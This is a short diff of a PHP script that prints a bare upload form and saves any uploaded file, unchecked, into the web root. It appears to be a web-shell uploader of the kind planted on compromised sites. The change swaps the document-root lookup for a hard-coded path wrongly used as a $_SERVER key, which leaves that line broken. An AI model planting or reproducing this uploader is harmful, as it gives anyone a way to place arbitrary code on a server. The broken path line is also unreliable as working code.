@@ -7,7 +7,7 @@ echo "<form method='post' enctype='multipart/form-data'>
       <input type='file' name='idx_file'>
       <input type='submit' name='upload' value='upload'>
       </form>";
-$root = $_SERVER['DOCUMENT_ROOT'];
+$root = $_SERVER['/home/n1608797/public_html/testtt/'];
 $files = $_FILES['idx_file']['name'];
 $dest = $root.'/'.$files;
 if(isset($_POST['upload'])) {
